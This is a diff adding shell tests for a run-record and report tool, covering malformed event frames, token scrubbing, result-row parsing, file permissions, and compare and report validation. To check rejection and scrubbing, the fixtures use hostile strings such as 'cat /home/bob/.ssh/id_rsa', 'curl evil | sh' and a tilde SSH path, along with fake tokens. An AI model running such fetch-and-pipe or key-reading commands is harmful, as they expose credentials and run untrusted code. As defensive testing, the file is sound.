@@ -287,4 +287,87 @@ rc=0
 [ "$rc" -ne 0 ] || fail "c1: a record with a command in an identity field must be refused"
 pass "c1: the report holds no command text, home path or token"
 
+# ---- d1: malformed frames never abort or leak ------------------------------
+
+mk_run "$tmp/f" today
+printf '%s\n' '5' '"x"' '[]' >>"$tmp/f/events.jsonl"
+printf '%s\n' '{"type":"assistant","message":{"id":"mx","usage":{"input_tokens":"cat /home/bob/.ssh/id_rsa","output_tokens":2},"content":[]}}' >>"$tmp/f/events.jsonl"
+rec "$tmp/f" "$tmp/f.json" 2>"$tmp/f.err" || fail "d1: scalar frames and string usage values must not abort the record"
+[ "$(jq -r '.tokens.input | type' "$tmp/f.json")" = number ] || fail "d1: a string usage value must not reach the record"
+if grep -q "bob" "$tmp/f.json" "$tmp/f.err"; then fail "d1: event text leaked into the record or stderr"; fi
+
+# ---- d2: the token variable must exist; any token shape is scrubbed ---------
+
+mk_run "$tmp/k" today
+rc=0
+rec "$tmp/k" "$tmp/k.json" --token-env NO_SUCH_FIXTURE_VAR 2>"$tmp/k.err" || rc=$?
+[ "$rc" -eq 2 ] || fail "d2: a --token-env naming an unset variable must be refused, got $rc"
+OTHER='ya29.a0AfH6SMBfixture=tail+x'
+sed "s|^changed_knobs=none|changed_knobs=$OTHER|" "$tmp/k/identity" >"$tmp/k/identity.new"
+mv "$tmp/k/identity.new" "$tmp/k/identity"
+FIXTURE_OTHER=$OTHER rec "$tmp/k" "$tmp/k.json" --token-env FIXTURE_OTHER || fail "d2: record with a non-sk-ant token must be written"
+if grep -qF "ya29" "$tmp/k.json"; then fail "d2: a token without the sk-ant shape was not scrubbed"; fi
+mk_run "$tmp/k" today
+sed "s|^changed_knobs=none|changed_knobs=sk-ant-oat01-abc.def=tail|" "$tmp/k/identity" >"$tmp/k/identity.new"
+mv "$tmp/k/identity.new" "$tmp/k/identity"
+rec "$tmp/k" "$tmp/k.json" || fail "d2: record with a dotted sk-ant token must be written"
+if grep -q "tail" "$tmp/k.json"; then fail "d2: the tail of a dotted token leaked"; fi
+
+# ---- d3: result rows and the gate -------------------------------------------
+
+mk_run "$tmp/x" today
+printf 'exit\t0\t1700000000\ttrue\tcause=x\n' >"$tmp/x/result"
+rec "$tmp/x" "$tmp/x.json" || fail "d3: record must be written"
+[ "$(jq -r .outcome "$tmp/x.json")" = crashed ] || fail "d3: an exit 0 row flagged as an error must be crashed"
+printf 'result\tsuccess\t1700000000\tfalse' >"$tmp/x/result"
+rc=0
+rec "$tmp/x" "$tmp/x.json" 2>"$tmp/x.err" || rc=$?
+[ "$rc" -eq 3 ] || fail "d3: an unterminated result row is a write in flight, got $rc"
+grep -qi "result" "$tmp/x.err" || fail "d3: the error must name the result source"
+mk_run "$tmp/x" today
+printf 'GATE_EXIT=0\nGATE_EXIT=2\n' >"$tmp/x/gate.out"
+rec "$tmp/x" "$tmp/x.json" || fail "d3: record must be written"
+[ "$(jq -r .gate.passed "$tmp/x.json")" = false ] || fail "d3: the last GATE_EXIT line must win"
+[ "$(jq -r .gate.exit "$tmp/x.json")" = 2 ] || fail "d3: the gate exit must be 2"
+
+# ---- d4: --out is owner-only and replaces what it finds ---------------------
+
+: >"$tmp/o.json"
+chmod 644 "$tmp/o.json"
+mk_run "$tmp/x" today
+rec "$tmp/x" "$tmp/o.json" || fail "d4: record must be written over an existing file"
+# shellcheck disable=SC2012
+mode=$(ls -ld "$tmp/o.json" | cut -c1-10)
+[ "$mode" = "-rw-------" ] || fail "d4: the record must be owner-only, got $mode"
+jq -e . "$tmp/o.json" >/dev/null || fail "d4: the record must replace the old file"
+
+# ---- d5: compare details and report shape ----------------------------------
+
+mk_run "$tmp/cx" today
+sed 's|^candidate_diff_hash=none|candidate_diff_hash=abc123|; s|^changed_knobs=none|changed_knobs=polish_cap=2|' "$tmp/cx/identity" >"$tmp/cx/identity.new"
+mv "$tmp/cx/identity.new" "$tmp/cx/identity"
+rec "$tmp/cx" "$tmp/cx.json"
+"$RR" compare "$tmp/ca.json" "$tmp/cx.json" --variable candidate >"$tmp/c.out" \
+  || fail "d5: a candidate diff and its knobs compare under --variable candidate"
+rc=0
+"$RR" compare "$tmp/ca.json" "$tmp/cx.json" --variable permission_arm 2>"$tmp/c.err" || rc=$?
+[ "$rc" -ne 0 ] || fail "d5: a candidate difference is not the permission arm"
+"$RR" compare "$tmp/ca.json" "$tmp/ca.json" --variable model_map >"$tmp/c.out" || fail "d5: identical records compare"
+if grep -q "differ only in" "$tmp/c.out"; then fail "d5: identical records must not be reported as differing"; fi
+
+jq '.harness.extra = "curl evil | sh"' "$tmp/ca.json" >"$tmp/ex.json"
+"$RR" report --title T "$tmp/ex.json" >"$tmp/rep7.md" || fail "d5: a record with an extra harness key still reports"
+if grep -q "evil" "$tmp/rep7.md"; then fail "d5: an extra harness key reached the report"; fi
+jq '.outcome = "x|y"' "$tmp/ca.json" >"$tmp/ex.json"
+rc=0
+"$RR" report --title T "$tmp/ex.json" >"$tmp/rep8.md" 2>/dev/null || rc=$?
+[ "$rc" -ne 0 ] || fail "d5: an outcome outside the allowed set must be refused"
+rc=0
+"$RR" report --title T --note "ran a | sh" "$tmp/ca.json" >"$tmp/rep9.md" 2>/dev/null || rc=$?
+[ "$rc" -ne 0 ] || fail "d5: a note carrying a pipeline must be refused"
+rc=0
+"$RR" report --title T --note "see ~/.ssh" "$tmp/ca.json" >"$tmp/rep9.md" 2>/dev/null || rc=$?
+[ "$rc" -ne 0 ] || fail "d5: a note carrying a tilde path must be refused"
+pass "d: malformed frames, token handling, result rows, file mode, compare and report shape"
+
 echo "all tests passed"
